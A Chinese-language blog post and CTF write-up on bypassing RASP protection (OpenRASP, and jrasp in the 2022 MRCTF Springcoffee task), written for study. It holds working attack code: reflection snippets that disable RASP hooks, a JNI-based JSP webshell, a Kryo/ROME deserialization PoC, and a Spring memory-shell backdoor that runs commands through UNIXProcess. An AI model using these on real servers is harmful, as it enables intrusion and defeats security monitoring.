title: RASP绕过初探
author: bmth
tags:
  - RASP
categories:
  - java
top_img: 'https://img-blog.csdnimg.cn/02117228689e4246a9872615fb3d91d7.png'
cover: 'https://img-blog.csdnimg.cn/02117228689e4246a9872615fb3d91d7.png'
date: 2022-11-02 22:13:00
---
![](https://img-blog.csdnimg.cn/02117228689e4246a9872615fb3d91d7.png)

>最近看完了赛博朋克边缘行者，我愿称之为年度最强番，扳机社太强了，塑造的02和lucy都很戳我
>《I Really Want to Stay At Your House》一响直接泪目了xd

RASP是`Runtime application self-protection`的缩写，中文翻译为应用程序运行时防护，其与WAF等传统安全防护措施的主要区别于其防护层级更加底层——在功能调用前或调用时能获取访问到当前方法的参数等信息，根据这些信息来判定是否安全

RASP与传统的基于流量监测的安全防护产品来说，优势点在于**可以忽略各种绕过流量检测的攻击方式（如分段传输，编码等），只关注功能运行时的传参是否会产生安全威胁。简单来说，RASP不看过程，只看具体参数导致方法实现时是否会产生安全威胁**。简单类比一下，RASP就相当于应用程序的主防，其判断是更加精准的。

## OpenRASP
官网地址：[https://rasp.baidu.com/](https://rasp.baidu.com/)
OpenRASP是该技术的开源实现，可以在不依赖请求特征的情况下，准确的识别代码注入、反序列化等应用异常，很好的弥补了传统设备防护滞后的问题

在 [https://packages.baidu.com/app/openrasp/release/](https://packages.baidu.com/app/openrasp/release/)下载最新版本，我这里是1.3.7，选择下载rasp-java.zip
参考：[https://rasp.baidu.com/doc/install/manual/spring-boot.html](https://rasp.baidu.com/doc/install/manual/spring-boot.html)，配置单机版本即可，将所有的命令执行设置为block

![](https://img-blog.csdnimg.cn/5e9abccfee3d48d4a3a7eb5572ed874e.png)

根据文档进行安装，这里的 `<spring_boot_folder>` 通常是 XXX.jar 包所在的目录
```bash
java -jar RaspInstall.jar -nodetect -install <spring_boot_folder>
java -javaagent:<spring_boot_folder>/rasp/rasp.jar -jar XXX.jar
```
![](https://img-blog.csdnimg.cn/7d37fb60b0374eb690245f5f5f77c2fb.png)

成功使用openrasp启动

### 命令执行绕过

参考：[多种姿势openrasp命令执行绕过](https://www.anquanke.com/post/id/195016)
根据文章可以知道有两种方法绕过

#### 绕过方法一
rasp会判断请求url是否为空来判断是否校验，判断条件需要一个环境上下文(请求线程)
我们只要开启一个新的线程，由子线程去调用`Runtime.getRuntime.exec()`，Rasp判断并不是用户请求线程触发了hook函数，就会放行命令执行操作
![](https://img-blog.csdnimg.cn/ff892a70ec924f8f9ee9d3e4e70d89b2.png)


我们正常反序列化执行命令会发现
![](https://img-blog.csdnimg.cn/8133ca1a41374f8c8677152c519dface.png)

但假如我们使用线程来执行命令
```java
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;

import java.io.IOException;

public class BypassRasp extends AbstractTranslet implements Runnable{
    public BypassRasp(){
        new Thread(this).start();
    }

    @Override
    public void transform(com.sun.org.apache.xalan.internal.xsltc.DOM document, com.sun.org.apache.xml.internal.serializer.SerializationHandler[] handlers) throws com.sun.org.apache.xalan.internal.xsltc.TransletException {
    }
    
    @Override
    public void transform(com.sun.org.apache.xalan.internal.xsltc.DOM document, com.sun.org.apache.xml.internal.dtm.DTMAxisIterator iterator, com.sun.org.apache.xml.internal.serializer.SerializationHandler handler) throws com.sun.org.apache.xalan.internal.xsltc.TransletException {
    }

    @Override
    public void run() {
        try {
            boolean isLinux = true;
            String osTyp = System.getProperty("os.name");
            if (osTyp != null && osTyp.toLowerCase().contains("win")) {
                isLinux = false;
            }
            String[] cmds = isLinux ? new String[]{"sh", "-c","gnome-calculator"} : new String[]{"cmd.exe", "/c", "calc"};
            Runtime.getRuntime().exec(cmds);
        }catch (IOException e){}
    }
}
```
![](https://img-blog.csdnimg.cn/aedd6c13fbfe40c4abdf496fda3d1c30.png)

可以看到成功执行命令，反弹计算器


#### 绕过方法二
假如存在反序列化漏洞，我们通常可以通过TemplatesImpl去加载任意字节码，那么就可以直接使用反射的方式，修改rasp的HookHandler类的变量enableHook设置为false，而这个变量是全局的开关，所以我们只需重新关闭这个开关就可以使rasp失效。实现全局绕过
![](https://img-blog.csdnimg.cn/a09712cbf90f4bcd913ae6291c15cece.png)

```java
Object o = Class.forName("com.baidu.openrasp.HookHandler").newInstance();
Field f = o.getClass().getDeclaredField("enableHook");
Field m = f.getClass().getDeclaredField("modifiers");
m.setAccessible(true);
m.setInt(f, f.getModifiers() & ~Modifier.FINAL);
f.set(o, new AtomicBoolean(false));
```

还有Y4师傅找到的：
比如在执行检测前中间的调用流程有个`com.baidu.openrasp.HookHandler#doCheckWithoutRequest`，这里面提到了如果服务器的cpu使用率超过90%，禁用全部hook点
![](https://img-blog.csdnimg.cn/cc8b4366faf04e119199c3c50130dae3.png)

```java
Class<?> clz = Thread.currentThread().getContextClassLoader().loadClass("com.baidu.openrasp.config.Config");
java.lang.reflect.Method getConfig = clz.getDeclaredMethod("getConfig");
java.lang.reflect.Field disableHooks = clz.getDeclaredField("disableHooks");
disableHooks.setAccessible(true);
Object ins = getConfig.invoke(null);

disableHooks.set(ins,true);
```
反射设置`disableHooks`为true即可

可以看到上面两种方法的利用条件都十分苛刻，需要存在反序列化漏洞或者JNDI注入，并且没有被openrasp拦截才可以


参考：
[浅谈 RASP](https://paper.seebug.org/1041/)
[OpenRasp分析](https://y4tacker.github.io/2022/05/28/year/2022/5/OpenRasp%E5%88%86%E6%9E%90)
[OpenRASP学习笔记](https://www.anquanke.com/post/id/216886)


## JNI绕过RASP
JNI的全称叫做（Java Native Interface），其作用就是让我们的Java程序去调用C的程序。实际上调用的并不是exe程序，而是编译好的dll动态链接库里面封装的方法


Tomcat环境下，需要以下限制条件：

- 固定包名格式为`org.apache.jsp`
- java文件名称需要固定格式： `***_jsp` ，并且后面的jsp文件名称需要同其保持一致。例如 `testtomcat_jsp.java`，那么最终jsp的文件名称需要命名为`testtomcat.jsp`


我们首先新建package为`org.apache.jsp`，类名为`testtomcat_jsp`的.java文件
```java
package org.apache.jsp;
public class testtomcat_jsp
{
  class JniClass
  {
       public native String exec( String string );
  }
}
```
然后javac编译成class文件
```bash
javac testtomcat_jsp.java
```
命令执行后，生成文件`testtomcat_jsp.class`和`testtomcat_jsp$JniClass.class`
![](https://img-blog.csdnimg.cn/d5431fdba06f4305b9e8275fe25b911c.png)

然后执行
```bash
javah -jni org.apache.jsp.testtomcat_jsp$JniClass
```
生成文件 `org_apache_jsp_testtomcat_jsp_JniClass.h`
为了简化后续C++工程的配置，将 `#include <jni.h>` 修改为 `#include "jni.h"`
![](https://img-blog.csdnimg.cn/8106b1ef12924633b0a00b45d22f9b90.png)

接下来编写命令执行的C语言代码JniClass.c：
```c
#include "jni.h"
#include "org_apache_jsp_testtomcat_jsp_JniClass.h"
#include <string.h>
#include <stdio.h>
#include <sys/types.h>
#include <unistd.h>
#include <stdlib.h>

int execmd(const char *cmd, char *result)
{
    char buffer[1024*12];              //定义缓冲区
    FILE *pipe = _popen(cmd, "r"); //打开管道，并执行命令
    if (!pipe)
        return 0; //返回0表示运行失败

    while (!feof(pipe))
    {
        if (fgets(buffer, 128, pipe))
        { //将管道输出到result中
            strcat(result, buffer);
        }
    }
    _pclose(pipe); //关闭管道
    return 1;      //返回1表示运行成功
}
JNIEXPORT jstring JNICALL Java_org_apache_jsp_testtomcat_1jsp_00024JniClass_exec(JNIEnv *env, jobject class_object, jstring jstr)
{

    const char *cstr = (*env)->GetStringUTFChars(env, jstr, NULL);
    char result[1024 * 12] = ""; //定义存放结果的字符串数组
    if (1 == execmd(cstr, result))
    {
       // printf(result);
    }

    char return_messge[100] = "";
    strcat(return_messge, result);
    jstring cmdresult = (*env)->NewStringUTF(env, return_messge);
    //system();

    return cmdresult;
}
```
使用gcc将该c源码编译为dll或者lib（注意jdk版本要与目标机器的jdk保持一致）
```bash
gcc -I "C:\Java\jdk1.8.0_231\include" -I "C:\Java\jdk1.8.0_231\include\win32" --shared JniClass.c -o 1.dll
```
最后在web目录下创建testtomcat.jsp，内容如下：
```java
<%@ page contentType="text/html;charset=UTF-8" language="java" %>
<%!
    class JniClass {
        public native String exec(String string);
        public JniClass() {
            System.load("C:\\Users\\bmth\\Desktop\\作业\\CTF学习\\上传文件\\jsp\\jni\\1.dll");
        }
    }
%>
<%
    String cmd  = request.getParameter("cmd");
    if (cmd != null) {
        JniClass a = new JniClass();
        String res = a.exec(cmd);
        out.println(res);
    }
    else{
        response.sendError(404);
    }
%>
```
![](https://img-blog.csdnimg.cn/f94cc7a980f24e46937a0ca165db6088.png)

成功执行命令
**注：jsp文件名称需要同之前的java文件保持一致**

利用条件也比较苛刻，需要将dll文件和jsp文件都上传上去，最后使用jsp去调用该dll文件
或者使用unc路径，远程调用dll文件

>需要注意UNC 默认是走 445 端口的，如果没有特殊情况，公网上都是屏蔽了这个端口的
这里有一个小trick，就是利用 windows 一个特性，在开启了 webclient 服务的情况下，UNC 访问 445 失败时，会尝试访问目标服务器80端口的 webdav 去加载资源



参考：
[Java安全之JNI绕过RASP](https://www.cnblogs.com/nice0e3/p/14067160.html)
[JNI技术绕过rasp防护实现jsp webshell](https://cloud.tencent.com/developer/article/1541566)
[Java利用技巧——通过JNI加载dll](https://zhuanlan.zhihu.com/p/483289588)
[SCTF2019 babyEoP Writeup](https://jayl1n.github.io/2019/06/26/sctf-2019-babyEoP-Writeup/)


## 赛题复现

### [2022MRCTF]Springcoffee

题目源码：[https://github.com/EkiXu/My-CTF-Challenge/tree/main/springcoffee](https://github.com/EkiXu/My-CTF-Challenge/tree/main/springcoffee)

看到依赖，存在kryo 5.3.0，JSON-20220320，rome 1.7.0这三个重点，很明显是触发kryo反序列化的
![](https://img-blog.csdnimg.cn/1e39bb712aaf4c20899e7913a3b1c700.png)

可以看到其中`/coffee/order`是触发反序列化的地方
![](https://img-blog.csdnimg.cn/3419cf6231f84c11bfcabf567493d2af.png)

`/coffee/demo`可以根据我们前端传入的json执行对应的set方法做属性更改
![](https://img-blog.csdnimg.cn/53cfa6285c85499c83f3b9a4b0c46acf.png)

先学一下 kryo 的反序列化

#### kryo反序列化
Kryo 是一个快速序列化/反序列化工具，其使用了字节码生成机制。Kryo 序列化出来的结果，是其自定义的、独有的一种格式，不再是 JSON 或者其他现有的通用格式；而且，其序列化出来的结果是二进制的（即 `byte[]`，而 JSON 本质上是字符串 String），序列化、反序列化时的速度也更快

其相对于其他反序列化类的特点是可以使用它来序列化或反序列化任何Java类型，而不需要实现Serializable
可以看到marshalsec的pdf文件介绍：

![https://img-blog.csdnimg.cn/9f70bbccba244a99a13c18d485b32c27.png](https://img-blog.csdnimg.cn/9f70bbccba244a99a13c18d485b32c27.png)

但是marshalsec里包含的是4.0.0的版本，我们这里是最新的版本5.3.0，有了较大的重构
第一个问题是`com.esotericsoftware.kryo.Kryo`类的`registrationRequired`属性默认设置为true
![](https://img-blog.csdnimg.cn/885cfbb6722948279bc0af8120eda450.png)

只有被注册过的类才可以被序列化和反序列化，并且默认只注册了下面的类：
```
// Primitives and string. Primitive wrappers automatically use the same registration as primitives.
this.register(Integer.TYPE, new IntSerializer());
this.register(String.class, new StringSerializer());
this.register(Float.TYPE, new FloatSerializer());
this.register(Boolean.TYPE, new BooleanSerializer());
this.register(Byte.TYPE, new ByteSerializer());
this.register(Character.TYPE, new CharSerializer());
this.register(Short.TYPE, new ShortSerializer());
this.register(Long.TYPE, new LongSerializer());
this.register(Double.TYPE, new DoubleSerializer());
```
由于我们可以set任意属性，那么选择`setRegistrationRequired`将其设置为 false 进行处理
```json
{"polish":"true","RegistrationRequired":false}
```
然后又发现一个问题`Class cannot be created (missing no-arg constructor)`
![](https://img-blog.csdnimg.cn/c9c54b21285942fe853306b8ebe5b2a6.png)

需要该类有一个无参数的构造函数，否则抛出类创建异常，导致无法反序列化，修改为
```json
{"polish":"true","RegistrationRequired":false,"InstantiatorStrategy": "org.objenesis.strategy.StdInstantiatorStrategy"}
```
因为在Springboot里面默认生成的对象是单例模式，所以修改了类的属性之后都会一直存在，只需要执行一次就可以了

最后发现`_tfactory`空指针异常，因为不是使用原生反序列化的，`TemplateImpl`的`_tfactory`会在序列化过程中丢失，所以无法直接用，改成二次反序列化就可以了
`ROME->SignedObject->ROME->TemplateImpl`

```java
import com.esotericsoftware.kryo.Kryo;
import com.esotericsoftware.kryo.io.Output;
import com.esotericsoftware.kryo.io.Input;
import com.rometools.rome.feed.impl.EqualsBean;
import com.rometools.rome.feed.impl.ObjectBean;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import javassist.ClassPool;
import org.json.JSONObject;
import tools.Evil;

import javax.xml.transform.Templates;
import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.security.KeyPair;
import java.security.KeyPairGenerator;
import java.security.Signature;
import java.security.SignedObject;
import java.util.Base64;
import java.util.HashMap;

public class rome_poc {
    public static void setFieldValue(Object obj, String field, Object arg) throws Exception{
        Field f = obj.getClass().getDeclaredField(field);
        f.setAccessible(true);
        f.set(obj, arg);
    }
    public static void main(String[] args) throws Exception {
        Kryo kryo = new Kryo();
        String raw = "{\"polish\":\"true\",\"RegistrationRequired\":false,\"InstantiatorStrategy\": \"org.objenesis.strategy.StdInstantiatorStrategy\"}";

        JSONObject serializeConfig = new JSONObject(raw);
        if (serializeConfig.has("polish") && serializeConfig.getBoolean("polish")) {
            Method[] var3 = kryo.getClass().getDeclaredMethods();
            int var4 = var3.length;
            for(int var5 = 0; var5 < var4; ++var5) {
                Method setMethod = var3[var5];
                if (setMethod.getName().startsWith("set")) {
                    try {
                        Object p1 = serializeConfig.get(setMethod.getName().substring(3));
                        if (!setMethod.getParameterTypes()[0].isPrimitive()) {
                            try {
                                p1 = Class.forName((String)p1).newInstance();
                                setMethod.invoke(kryo, p1);
                            } catch (Exception var9) {
                                var9.printStackTrace();
                            }
                        } else {
                            setMethod.invoke(kryo, p1);
                        }
                    } catch (Exception var10) {
                    }
                }
            }
        }

        byte[] bytes=ClassPool.getDefault().get(Evil.class.getName()).toBytecode();

        TemplatesImpl obj = new TemplatesImpl();
        setFieldValue(obj, "_bytecodes", new byte[][]{bytes});
        setFieldValue(obj, "_name", "a");
        setFieldValue(obj, "_tfactory", new TransformerFactoryImpl());

        HashMap hashMap1 = getpayload(Templates.class, obj);

        KeyPairGenerator kpg = KeyPairGenerator.getInstance("DSA");
        kpg.initialize(1024);
        KeyPair kp = kpg.generateKeyPair();
        SignedObject signedObject = new SignedObject(hashMap1, kp.getPrivate(), Signature.getInstance("DSA"));

        HashMap hashMap2 = getpayload(SignedObject.class, signedObject);

        //序列化
        ByteArrayOutputStream bos = new ByteArrayOutputStream();
        Output output = new Output(bos);
        kryo.writeClassAndObject(output, hashMap2);
        output.close();
        System.out.println(Base64.getEncoder().encodeToString(bos.toByteArray()));

        //反序列化
        ByteArrayInputStream bas = new ByteArrayInputStream(bos.toByteArray());
        Input input = new Input(bas);
        kryo.readClassAndObject(input);
    }

    public static HashMap getpayload(Class clazz, Object obj) throws Exception {
        ObjectBean objectBean = new ObjectBean(ObjectBean.class, new ObjectBean(String.class, "rand"));
        HashMap hashMap = new HashMap();
        hashMap.put(objectBean, "rand");
        ObjectBean expObjectBean = new ObjectBean(clazz, obj);
        setFieldValue(objectBean, "equalsBean", new EqualsBean(ObjectBean.class, expObjectBean));
        return hashMap;
    }
}
```
![](https://img-blog.csdnimg.cn/9b141e07a7b4484f988ba8ebdffdd6ed.png)

参考：
[Dubbo反序列化漏洞分析集合2](https://tttang.com/archive/1747/)
[从Kryo反序列化到Marshalsec框架到CVE挖掘](https://cloud.tencent.com/developer/article/1624416)
[Kryo反序列化学习](https://blog.oversec.fun/kryo-deserialize-learn)

#### rasp绕过

看到Y4师傅的文章，这里学到一个读文件
```java
String code = request.getParameter("read");
java.io.PrintWriter writer = response.getWriter();
String urlContent = "";
URL url = new URL(code);
BufferedReader in = new BufferedReader(new InputStreamReader(url.openStream()));
String inputLine = "";
while ((inputLine = in.readLine()) != null) {
    urlContent = urlContent + inputLine + "\n";
}
in.close();
writer.println(urlContent);
writer.flush();
writer.close();
```

命令执行用不了，读文件总可以吧，使用`file:`或者`netdoc:`，
![](https://img-blog.csdnimg.cn/9838f7231da84c5fb70b7894077cc121.png)

下载下来jrasp.jar，然后看到Rasp的关键代码
![](https://img-blog.csdnimg.cn/55a2270bccec4d2497051b8b6fb0c259.png)

只要执行到`java.lang.ProcessImpl`的start方法，就会被ban掉，而这也就封掉了之前常见的Runtime、ProcessBuilder、js执行等等，因为都会调用到 `java.lang.ProcessImpl`


绕过的方法也很简单，直接到更底层即：`UNIXProcess`类(这个类只存在于linux和mac系统，并且在JDK9的时候把`UNIXProcess`合并到了`ProcessImpl`当中)

`UNIXProcess`和`ProcessImpl`其实就是最终调用native执行系统命令的类，这个类提供了一个叫`forkAndExec`的native方法，如方法名所述主要是通过`fork&exec`来执行本地系统命令
![](https://img-blog.csdnimg.cn/e4b668b70e694a08a9b2531c49e4f195.png)

最后执行命令的payload如下，写个Controller内存马，参考：[Java本地命令执行](https://javasec.org/javase/CommandExecution/)
```java
import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.context.WebApplicationContext;
import org.springframework.web.context.request.RequestContextHolder;
import org.springframework.web.context.request.ServletRequestAttributes;
import org.springframework.web.servlet.mvc.condition.RequestMethodsRequestCondition;
import org.springframework.web.servlet.mvc.method.RequestMappingInfo;
import org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping;

import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.io.*;
import java.lang.reflect.Constructor;
import java.lang.reflect.Method;

public class InjectToController extends AbstractTranslet {

    public InjectToController() {
        try {
            WebApplicationContext context = (WebApplicationContext) RequestContextHolder.currentRequestAttributes().getAttribute("org.springframework.web.servlet.DispatcherServlet.CONTEXT", 0);
            RequestMappingHandlerMapping mappingHandlerMapping = context.getBean(RequestMappingHandlerMapping.class);
            Method method2 = InjectToController.class.getMethod("test");
            RequestMethodsRequestCondition ms = new RequestMethodsRequestCondition();

            Method getMappingForMethod = mappingHandlerMapping.getClass().getDeclaredMethod("getMappingForMethod", Method.class, Class.class);
            getMappingForMethod.setAccessible(true);
            RequestMappingInfo info = (RequestMappingInfo) getMappingForMethod.invoke(mappingHandlerMapping, method2, InjectToController.class);

            InjectToController springControllerMemShell = new InjectToController("aaa");
            mappingHandlerMapping.registerMapping(info, springControllerMemShell, method2);
        } catch (Exception e) {

        }
    }

    public InjectToController(String aaa) {
    }

    @RequestMapping("/shell")
    public void test() throws IOException {
        HttpServletRequest request = ((ServletRequestAttributes) (RequestContextHolder.currentRequestAttributes())).getRequest();
        HttpServletResponse response = ((ServletRequestAttributes) (RequestContextHolder.currentRequestAttributes())).getResponse();

        String[] cmd = request.getParameterValues("cmd");
        if (cmd != null) {
            try {
                PrintWriter writer = response.getWriter();
                String o = "";
                InputStream in = start(cmd);
                String result = inputStreamToString(in, "UTF-8");
                writer.write(result);
                writer.flush();
                writer.close();
            } catch (Exception var9) {
            }
        }
    }
    private static byte[] toCString(String var0) {
        if (var0 == null) {
            return null;
        } else {
            byte[] var1 = var0.getBytes();
            byte[] var2 = new byte[var1.length + 1];
            System.arraycopy(var1, 0, var2, 0, var1.length);
            var2[var2.length - 1] = 0;
            return var2;
        }
    }
    public InputStream start(String[] strs) throws Exception {
        String unixClass = new String(new byte[]{106, 97, 118, 97, 46, 108, 97, 110, 103, 46, 85, 78, 73, 88, 80, 114, 111, 99, 101, 115, 115});
        String processClass = new String(new byte[]{106, 97, 118, 97, 46, 108, 97, 110, 103, 46, 80, 114, 111, 99, 101, 115, 115, 73, 109, 112, 108});
        Class clazz = null;
        try {
            clazz = Class.forName(unixClass);
        } catch (ClassNotFoundException var30) {
            clazz = Class.forName(processClass);
        }
        Constructor<?> constructor = clazz.getDeclaredConstructors()[0];
        constructor.setAccessible(true);

        assert strs != null && strs.length > 0;

        byte[][] args = new byte[strs.length - 1][];
        int size = args.length;

        for(int i = 0; i < args.length; ++i) {
            args[i] = strs[i + 1].getBytes();
            size += args[i].length;
        }

        byte[] argBlock = new byte[size];
        int i = 0;
        byte[][] var10 = args;
        int var11 = args.length;

        for(int var12 = 0; var12 < var11; ++var12) {
            byte[] arg = var10[var12];
            System.arraycopy(arg, 0, argBlock, i, arg.length);
            i += arg.length + 1;
        }

        int[] envc = new int[1];
        int[] std_fds = new int[]{-1, -1, -1};
        FileInputStream f0 = null;
        FileOutputStream f1 = null;
        FileOutputStream f2 = null;
        try {
            if (f0 != null) {
                ((FileInputStream)f0).close();
            }
        } finally {
            try {
                if (f1 != null) {
                    ((FileOutputStream)f1).close();
                }
            } finally {
                if (f2 != null) {
                    ((FileOutputStream)f2).close();
                }
            }
        }
        Object object = constructor.newInstance(this.toCString(strs[0]), argBlock, args.length, null, envc[0], null, std_fds, false);
        Method inMethod = object.getClass().getDeclaredMethod("getInputStream");
        inMethod.setAccessible(true);
        return (InputStream)inMethod.invoke(object);
    }
    public String inputStreamToString(InputStream in, String charset) throws IOException {
        try {
            if (charset == null) {
                charset = "UTF-8";
            }
            ByteArrayOutputStream out = new ByteArrayOutputStream();
            int a = 0;
            byte[] b = new byte[1024];
            while((a = in.read(b)) != -1) {
                out.write(b, 0, a);
            }
            String var6 = new String(out.toByteArray());
            return var6;
        } catch (IOException var10) {
            throw var10;
        } finally {
            if (in != null) {
                in.close();
            }
        }
    }
    @Override
    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {
    }

    @Override
    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {
    }
}
```
![](https://img-blog.csdnimg.cn/1416ae60af27420a90fe980242602d7d.png)

成功执行命令

参考：
[2022MRCTF-Java部分](https://y4tacker.github.io/2022/04/24/year/2022/4/2022MRCTF-Java%E9%83%A8%E5%88%86/)
[MRCTF-java部分](https://dem0dem0.top/2022/05/30/mrctf2022java%E9%A2%98%E8%A7%A3/)
[MRCTF 2022 By W&M](https://blog.wm-team.cn/index.php/archives/18/)
